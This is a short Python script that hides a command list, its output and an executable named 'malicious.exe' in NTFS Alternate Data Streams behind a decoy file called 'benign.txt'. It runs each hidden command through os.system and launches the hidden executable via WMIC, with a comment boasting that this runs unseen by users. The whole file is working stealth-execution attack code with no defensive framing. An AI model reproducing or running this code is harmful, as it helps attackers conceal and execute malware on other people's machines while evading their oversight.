import os


def buildADSFilename(file_name: str, stream_name: str) -> str:
    return f"{file_name}:{stream_name}"


decoy: str = "benign.txt"
result_file: str = buildADSFilename(decoy, "results.txt")
command_file: str = buildADSFilename(decoy, "commands.txt")

with open(command_file, "r") as c_f:
    for line in c_f:
        os.system(f"{line.strip()} >> {result_file}")

exe_file: str = "malicious.exe"
exe_path: str = os.path.join(os.getcwd(), buildADSFilename(decoy, exe_file))

# print(exe_path)

os.system(f'wmic process call create "{exe_path}"')
# WMIC in Session 0, unable to be seen by users.
